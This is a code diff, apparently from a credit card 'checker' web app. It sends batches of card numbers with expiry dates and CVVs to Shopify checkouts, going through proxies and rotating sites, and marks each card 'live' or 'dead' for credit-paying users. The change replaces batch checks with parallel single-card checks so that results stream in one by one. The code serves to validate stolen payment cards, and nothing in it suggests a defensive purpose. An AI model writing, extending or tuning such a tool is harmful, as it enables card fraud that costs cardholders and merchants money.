@@ -3386,60 +3386,38 @@ const Gateways = () => {
         const waveCards = affordableCards.slice(cardIndex, waveEnd);
         const waveSize = waveCards.length;
         const threshold = Math.max(1, Math.min(waveSize - 1, WAVE_THRESHOLD)); // 49 of 50, or N-1 for smaller waves
-        console.log(`[SHOPIFY-WAVE] Starting batch wave: cards ${cardIndex + 1}-${waveEnd} (${waveSize} cards, threshold: ${threshold})`);
+        console.log(`[SHOPIFY-WAVE] Starting parallel wave: cards ${cardIndex + 1}-${waveEnd} (${waveSize} cards)`);
 
-        const response = await invokeShopifyBatch(
-          waveCards.map(cardData => `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.cvv}`)
-        );
-        const results = Array.isArray(response?.results) ? response.results : [];
-
-        // RETRY: any card whose batch result came back unknown/error gets a fresh
-        // single-card check so we always wait for a definitive live/dead before
-        // showing it in the result list.
-        const retryIndexes: number[] = [];
-        results.forEach((result: any, idx: number) => {
-          const cs = result?.computedStatus;
-          if (cs !== 'live' && cs !== 'dead') retryIndexes.push(idx);
-        });
-        if (retryIndexes.length > 0) {
-          console.log(`[SHOPIFY-WAVE] Retrying ${retryIndexes.length} unknown/error cards individually`);
-          await Promise.all(retryIndexes.map(async (idx) => {
-            const c = waveCards[idx];
-            try {
-              const r = await checkCardViaShopify(c.card, c.month, c.year, c.cvv);
-              if (r.status === 'live' || r.status === 'dead') {
-                results[idx] = {
-                  computedStatus: r.status,
-                  apiStatus: r.apiStatus,
-                  apiMessage: r.apiMessage,
-                  apiTotal: r.apiTotal,
-                  rawResponse: r.rawResponse,
-                };
-              }
-            } catch (e) {
-              console.warn('[SHOPIFY-WAVE] retry failed', e);
-            }
-          }));
-        }
-
-        // Ensure EVERY card in the wave gets a result row, even if the batch
-        // response is missing entries (network/edge errors). Missing entries
-        // fall back to an "unknown" placeholder so the user can see all
-        // checked cards in the result list.
-        for (let i = 0; i < waveCards.length; i++) {
-          const result = results[i] ?? {
-            computedStatus: 'unknown',
-            apiStatus: 'ERROR',
-            apiMessage: 'No response from gateway',
-            rawResponse: '',
-          };
+        // Fire all cards in parallel as INDEPENDENT single-card checks so each
+        // result renders the moment it resolves (one-by-one streaming UX),
+        // instead of waiting for the whole batch response.
+        const completed = new Array<boolean>(waveSize).fill(false);
+        await Promise.all(waveCards.map(async (c, i) => {
+          let result: any;
+          try {
+            const r = await checkCardViaShopify(c.card, c.month, c.year, c.cvv);
+            result = {
+              computedStatus: r.status,
+              apiStatus: r.apiStatus,
+              apiMessage: r.apiMessage,
+              apiTotal: r.apiTotal,
+              rawResponse: r.rawResponse,
+              usedSite: (r as any).usedSite,
+              allProxiesDead: (r as any).allProxiesDead,
+            };
+          } catch (e) {
+            console.warn('[SHOPIFY-WAVE] single-card check failed', e);
+            result = {
+              computedStatus: 'unknown',
+              apiStatus: 'ERROR',
+              apiMessage: e instanceof Error ? e.message : 'No response from gateway',
+              rawResponse: '',
+            };
+          }
+          completed[i] = true;
+          // Render this card's result immediately
           addShopifyResult(waveCards[i], result);
-        }
-
-        if (typeof response?.newCredits === 'number') {
-          remainingCredits = response.newCredits;
-          setUserCredits(response.newCredits);
-        }
+        }));
 
         console.log(`[SHOPIFY-WAVE] Wave complete (${waveSize} cards), moving to next wave`);
 
